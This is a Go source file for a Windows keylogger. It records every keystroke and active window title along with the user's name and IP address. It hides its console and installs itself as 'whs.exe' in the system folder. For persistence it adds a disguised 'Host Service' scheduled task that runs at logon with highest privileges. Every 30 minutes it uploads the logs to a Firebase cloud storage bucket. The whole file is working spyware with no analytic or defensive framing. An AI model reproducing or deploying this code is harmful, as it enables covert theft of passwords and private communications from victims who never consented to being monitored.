// goversioninfo
// go generate
// go build -ldflags "-H windowsgui"

package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"os/user"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"cloud.google.com/go/storage"
	firebase "firebase.google.com/go"
	"github.com/gios/amigo/constants"
	"golang.org/x/oauth2/google"
	"google.golang.org/api/option"
)

const (
	timeSaveMinutesInterval = 30
	timeLayout              = "2006-01-02 15:04:05 -0700"

	destinationFile = ""
	storageBucket   = ""

	accountType   = ""
	projectID     = ""
	privateKeyID  = ""
	privateKey    = ""
	clientEmail   = ""
	clientID      = ""
	authURI       = ""
	tokenURI      = ""
	authProvider  = ""
	clientCertURL = ""
)

var cloudScopes = []string{
	"https://www.googleapis.com/auth/cloud-platform",
	"https://www.googleapis.com/auth/datastore",
	"https://www.googleapis.com/auth/devstorage.full_control",
	"https://www.googleapis.com/auth/firebase",
	"https://www.googleapis.com/auth/identitytoolkit",
	"https://www.googleapis.com/auth/userinfo.email",
}

var (
	user32   = syscall.NewLazyDLL("user32.dll")
	kernel32 = syscall.NewLazyDLL("kernel32.dll")

	procGetAsyncKeyState         = user32.NewProc("GetAsyncKeyState")
	procGetForegroundWindow      = user32.NewProc("GetForegroundWindow")
	procGetWindowTextW           = user32.NewProc("GetWindowTextW")
	procGetKeyboardLayout        = user32.NewProc("GetKeyboardLayout")
	procGetWindowThreadProcessID = user32.NewProc("GetWindowThreadProcessId")
	procGetKeyboardState         = user32.NewProc("GetKeyboardState")
	procMapVirtualKey            = user32.NewProc("MapVirtualKeyA")
	procToUnicode                = user32.NewProc("ToUnicode")
	procActivateKeyboardLayout   = user32.NewProc("ActivateKeyboardLayout")

	procGetSystemDirectory = kernel32.NewProc("GetSystemDirectoryA")

	tmpTitle       string
	eventsBuf      string
	systemInfoData systemInfo
	bucketHandler  *storage.BucketHandle
	tmpKeylog      = make(chan string)
	tmpWindow      = make(chan string)
)

type systemInfo struct {
	systemFolder string
	userName     string
	userUsername string
	localIP      net.IP
}

type googleCredentials struct {
	AccountType   string `json:"type"`
	ProjectID     string `json:"project_id"`
	PrivateKeyID  string `json:"private_key_id"`
	PrivateKey    string `json:"private_key"`
	ClientEmail   string `json:"client_email"`
	ClientID      string `json:"client_id"`
	AuthURI       string `json:"auth_uri"`
	TokenURI      string `json:"token_uri"`
	AuthProvider  string `json:"auth_provider_x509_cert_url"`
	ClientCertURL string `json:"client_x509_cert_url"`
}

func (si *systemInfo) String() string {
	return time.Now().Format(timeLayout) + "\r\n" + "(log " + si.userName + " " + si.userUsername + " " + si.localIP.String() + ")" + "\r\n"
}

// User32.dll

func getForegroundWindow() (hwnd syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetForegroundWindow.Addr(), 0, 0, 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hwnd = syscall.Handle(r0)
	return
}

func getKeyboardState(keyboardState *uint16) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetKeyboardState.Addr(), 1, uintptr(unsafe.Pointer(keyboardState)), 0, 0)
	len = int32(r0)

	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func activateKeyboardLayout(hkl syscall.Handle) (hklResult syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procActivateKeyboardLayout.Addr(), 2, uintptr(hkl), 0x00000008, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hklResult = syscall.Handle(r0)
	return
}

func mapVirtualKey(uCode syscall.Handle) (scanCode syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procMapVirtualKey.Addr(), 2, uintptr(uCode), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	scanCode = syscall.Handle(r0)
	return
}

func toUnicode(virtKey syscall.Handle, scanCode syscall.Handle, keyState *uint16, pwszBuff *uint16) (value syscall.Handle) {
	r0, _, _ := syscall.Syscall6(
		procToUnicode.Addr(),
		6,
		uintptr(virtKey),
		uintptr(scanCode),
		uintptr(unsafe.Pointer(keyState)),
		uintptr(unsafe.Pointer(pwszBuff)),
		256,
		0,
	)

	value = syscall.Handle(r0)
	return
}

func getKeyboardLayout(dword syscall.Handle) (hkl syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetKeyboardLayout.Addr(), 1, uintptr(dword), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	hkl = syscall.Handle(r0)
	return
}

func getWindowThreadProcessID(hwnd syscall.Handle) (dword syscall.Handle, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowThreadProcessID.Addr(), 1, uintptr(hwnd), 0, 0)

	if e1 != 0 {
		err = error(e1)
		return
	}
	dword = syscall.Handle(r0)
	return
}

func getWindowText(hwnd syscall.Handle, str *uint16, maxCount int32) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetWindowTextW.Addr(), 3, uintptr(hwnd), uintptr(unsafe.Pointer(str)), uintptr(maxCount))
	len = int32(r0)

	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

// Kernel32.dll

func getSystemDirectory(lpBuffer *byte) (len int32, err error) {
	r0, _, e1 := syscall.Syscall(procGetSystemDirectory.Addr(), 2, uintptr(unsafe.Pointer(lpBuffer)), 256, 0)
	len = int32(r0)

	if len == 0 {
		if e1 != 0 {
			err = error(e1)
		} else {
			err = syscall.EINVAL
		}
	}
	return
}

func fileInterval() {
	writeTicker := time.NewTicker(10 * time.Second)
	saveTicker := time.NewTicker(1 * time.Minute)

	go func() {
		for {
			select {
			case <-writeTicker.C:
				writeLogFile(eventsBuf)
				eventsBuf = ""
			case <-saveTicker.C:
				diff, time := getFileDateDiff()
				if diff.Minutes() > timeSaveMinutesInterval {
					writeToBucket(time.Format(timeLayout) + "--" + systemInfoData.userUsername)
					createLogFile(true)
				}
			}
		}
	}()
}

func writeLogFile(data string) {
	cwd, GetwdErr := os.Getwd()
	if GetwdErr != nil {
		log.Panicf("cwd -> %v", GetwdErr)
	}
	file, openFileErr := os.OpenFile(cwd+"\\"+destinationFile, os.O_APPEND|os.O_WRONLY, 0777)
	if openFileErr != nil {
		log.Panicf("writeLogFile -> %v", openFileErr)
	}

	defer file.Close()

	if _, writeStringErr := file.WriteString(data); writeStringErr != nil {
		log.Panicf("writeLogFile -> %v", writeStringErr)
	}
}

func createLogFile(force bool) {
	cwd, GetwdErr := os.Getwd()
	if GetwdErr != nil {
		log.Panicf("cwd -> %v", GetwdErr)
	}

	if _, stateErr := os.Stat(cwd + "\\" + destinationFile); os.IsNotExist(stateErr) || force {
		log.Printf("create -> %v", cwd+"\\"+destinationFile)
		file, createErr := os.Create(cwd + "\\" + destinationFile)
		if createErr != nil {
			log.Panicf("createLogFile -> %v", createErr)
		}

		defer file.Close()
		file.WriteString(systemInfoData.String())
	}
}

func getFileDateDiff() (time.Duration, time.Time) {
	cwd, GetwdErr := os.Getwd()
	if GetwdErr != nil {
		log.Panicf("cwd -> %v", GetwdErr)
	}

	file, openErr := os.Open(cwd + "\\" + destinationFile)
	if openErr != nil {
		log.Panicf("open -> %v", openErr)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	scanner.Scan()

	parsedTime, parseErr := time.Parse(timeLayout, scanner.Text())
	if parseErr != nil {
		log.Panicf("parse -> %v", parseErr)
	}
	return time.Since(parsedTime), parsedTime
}

func getOutboundIP() net.IP {
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Panicf("getOutboundIP -> %v", err)
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return localAddr.IP
}

func getSystemInfo() {
	systemDirectory := make([]byte, 256)
	_, getSystemDirectoryErr := getSystemDirectory(&systemDirectory[0])
	if getSystemDirectoryErr != nil {
		log.Panicf("getSystemDirectory -> %v", getSystemDirectoryErr)
	}

	user, userErr := user.Current()
	if userErr != nil {
		log.Panicf("user.Current() -> %v", userErr)
	}

	systemInfoData = systemInfo{
		systemFolder: string(bytes.Trim(systemDirectory, "\x00")),
		userName:     user.Name,
		userUsername: user.Username,
		localIP:      getOutboundIP(),
	}
}

func windowLogger() {
	for {
		foregroundWindow, getForegroundWindowErr := getForegroundWindow()
		if getForegroundWindowErr != nil {
			log.Panicf("getForegroundWindow -> %v", getForegroundWindowErr)
		}
		window := make([]uint16, 256)
		getWindowText(foregroundWindow, &window[0], int32(len(window)))

		if syscall.UTF16ToString(window) != "" && tmpTitle != syscall.UTF16ToString(window) {
			tmpTitle = syscall.UTF16ToString(window)
			tmpWindow <- string("(" + time.Now().Format(timeLayout) + ")" + "[" + syscall.UTF16ToString(window) + "]\r\n")
		}
		time.Sleep(1 * time.Millisecond)
	}
}

func getLanguage() syscall.Handle {
	foregroundWindow, getForegroundWindowErr := getForegroundWindow()
	if getForegroundWindowErr != nil {
		log.Panicf("getForegroundWindow -> %v", getForegroundWindowErr)
	}
	hwnd, getWindowThreadProcessIDErr := getWindowThreadProcessID(foregroundWindow)
	if getWindowThreadProcessIDErr != nil {
		log.Panicf("getWindowThreadProcessID -> %v", getWindowThreadProcessIDErr)
	}
	hkl, getKeyboardLayoutErr := getKeyboardLayout(hwnd)

	if getKeyboardLayoutErr != nil {
		log.Panicf("getKeyboardLayout -> %v", getKeyboardLayoutErr)
	}

	return hkl
}

func getUnicodeKey(virtualCode int) string {
	keyboardBuf := make([]uint16, 256)

	_, getKeyboardStateErr := getKeyboardState(&keyboardBuf[0])
	if getKeyboardStateErr != nil {
		log.Panicf("getKeyboardState -> %v", getKeyboardStateErr)
	}

	scanCode, mapVirtualKeyErr := mapVirtualKey(syscall.Handle(virtualCode))
	if mapVirtualKeyErr != nil {
		log.Panicf("mapVirtualKey -> %v", mapVirtualKeyErr)
	}

	hkl := getLanguage()
	activateKeyboardLayout(hkl)

	unicodeBuf := make([]uint16, 256)
	toUnicode(syscall.Handle(virtualCode), scanCode, &keyboardBuf[0], &unicodeBuf[0])
	return syscall.UTF16ToString(unicodeBuf)
}

func keyLogger() {
	for {
		time.Sleep(1 * time.Millisecond)
		for Key := 0; Key <= 256; Key++ {
			Val, _, _ := procGetAsyncKeyState.Call(uintptr(Key))
			if Val&0x1 == 0 {
				continue
			}
			switch Key {
			case constants.VK_RETURN:
				tmpKeylog <- "\r\n[Enter]\r\n"
			case constants.VK_SPACE:
				tmpKeylog <- " "
			case constants.VK_MULTIPLY:
				tmpKeylog <- "*"
			case constants.VK_ADD:
				tmpKeylog <- "+"
			case constants.VK_SUBTRACT:
				tmpKeylog <- "-"
			case constants.VK_DECIMAL:
				tmpKeylog <- "."
			case constants.VK_SHIFT:
			case constants.VK_LBUTTON:
			case constants.VK_RBUTTON:
			case constants.VK_MBUTTON:
			case constants.VK_BACK:
			case constants.VK_TAB:
			case constants.VK_MENU:
			case constants.VK_CAPITAL:
			case constants.VK_ESCAPE:
			case constants.VK_PRIOR:
			case constants.VK_NEXT:
			case constants.VK_END:
			case constants.VK_HOME:
			case constants.VK_LEFT:
			case constants.VK_UP:
			case constants.VK_RIGHT:
			case constants.VK_DOWN:
			case constants.VK_SELECT:
			case constants.VK_PRINT:
			case constants.VK_EXECUTE:
			case constants.VK_SNAPSHOT:
			case constants.VK_INSERT:
			case constants.VK_DELETE:
			case constants.VK_HELP:
			case constants.VK_LWIN:
			case constants.VK_RWIN:
			case constants.VK_APPS:
			case constants.VK_SLEEP:
			case constants.VK_NUMPAD0:
			case constants.VK_NUMPAD1:
			case constants.VK_NUMPAD2:
			case constants.VK_NUMPAD3:
			case constants.VK_NUMPAD4:
			case constants.VK_NUMPAD5:
			case constants.VK_NUMPAD6:
			case constants.VK_NUMPAD7:
			case constants.VK_NUMPAD8:
			case constants.VK_NUMPAD9:
			case constants.VK_SEPARATOR:
			case constants.VK_DIVIDE:
			case constants.VK_F1:
			case constants.VK_F2:
			case constants.VK_F3:
			case constants.VK_F4:
			case constants.VK_F5:
			case constants.VK_F6:
			case constants.VK_F7:
			case constants.VK_F8:
			case constants.VK_F9:
			case constants.VK_F10:
			case constants.VK_F11:
			case constants.VK_F12:
			case constants.VK_NUMLOCK:
			case constants.VK_SCROLL:
			case constants.VK_LSHIFT:
			case constants.VK_RSHIFT:
			case constants.VK_LCONTROL:
			case constants.VK_RCONTROL:
			case constants.VK_LMENU:
			case constants.VK_RMENU:
				tmpKeylog <- ""
			default:
				unicodeKey := getUnicodeKey(Key)
				tmpKeylog <- unicodeKey
			}
		}
	}
}

func keyLoggerListener() {
	for {
		time.Sleep(1 * time.Millisecond)
		select {
		case key := <-tmpKeylog:
			eventsBuf = eventsBuf + key
		case window := <-tmpWindow:
			eventsBuf = eventsBuf + "\r\n" + window + "\r\n"
		default:
		}
	}
}

func addScheduler() {
	copyErr := copy(os.Args[0], systemInfoData.systemFolder+"\\"+"whs.exe")
	if copyErr != nil {
		log.Panicf("copy -> %v", copyErr)
	}
	cmd, err := exec.Command(
		"schtasks",
		"/create",
		"/sc", "ONLOGON",
		"/tn", "Host Service",
		"/f",
		"/rl", "HIGHEST",
		"/tr", systemInfoData.systemFolder+"\\"+"whs.exe",
		"/ru", systemInfoData.userUsername,
	).Output()

	if err != nil {
		log.Panicf("addScheduler -> %v", err)
	}
	log.Println(string(cmd))
}

func copy(src, dst string) error {
	if strings.ToLower(src) != strings.ToLower(dst) {
		cmd, _ := exec.Command(
			"taskkill",
			"/im",
			"whs.exe",
			"/f",
		).Output()
		if string(cmd) != "" {
			log.Println(string(cmd))
		}

		in, err := os.Open(src)
		if err != nil {
			return err
		}
		defer in.Close()

		out, err := os.Create(dst)
		if err != nil {
			return err
		}
		defer out.Close()

		_, err = io.Copy(out, in)
		if err != nil {
			return err
		}
	}
	return nil
}

func initFirebase() {
	config := &firebase.Config{
		StorageBucket: storageBucket,
	}

	credentialsJSON, marshalErr := json.Marshal(
		&googleCredentials{
			AccountType:   accountType,
			ProjectID:     projectID,
			PrivateKeyID:  privateKeyID,
			PrivateKey:    privateKey,
			ClientEmail:   clientEmail,
			ClientID:      clientID,
			AuthURI:       authURI,
			TokenURI:      tokenURI,
			AuthProvider:  authProvider,
			ClientCertURL: clientCertURL,
		},
	)

	if marshalErr != nil {
		log.Panicf("json Marshal -> %v", marshalErr)
	}

	credentials, credentialsFromJSONErr := google.CredentialsFromJSON(context.Background(), []byte(string(credentialsJSON)), cloudScopes...)
	if credentialsFromJSONErr != nil {
		log.Panicf("CredentialsFromJSON -> %v", credentialsFromJSONErr)
	}

	opt := option.WithCredentials(credentials)
	app, err := firebase.NewApp(context.Background(), config, opt)
	if err != nil {
		log.Panicf("newApp -> %v", err)
	}

	client, err := app.Storage(context.Background())
	if err != nil {
		log.Panicf("storage -> %v", err)
	}

	bucket, err := client.DefaultBucket()
	if err != nil {
		log.Panicf("bucket -> %v", err)
	}
	bucketHandler = bucket
}

func writeToBucket(name string) {
	objWriter := bucketHandler.Object(name).NewWriter(context.Background())
	defer objWriter.Close()

	cwd, GetwdErr := os.Getwd()
	if GetwdErr != nil {
		log.Panicf("cwd -> %v", GetwdErr)
	}
	destinationFileReader, openErr := os.Open(cwd + "\\" + destinationFile)
	if openErr != nil {
		log.Panicf("open -> %v", openErr)
	}
	defer destinationFileReader.Close()

	if _, copyErr := io.Copy(objWriter, destinationFileReader); copyErr != nil {
		log.Panicf("copy -> %v", copyErr)
	}
}

func main() {
	log.Println("Starting...")
	getSystemInfo()
	createLogFile(false)
	addScheduler()
	initFirebase()
	fileInterval()
	go keyLogger()
	go windowLogger()
	go keyLoggerListener()
	select {}
}
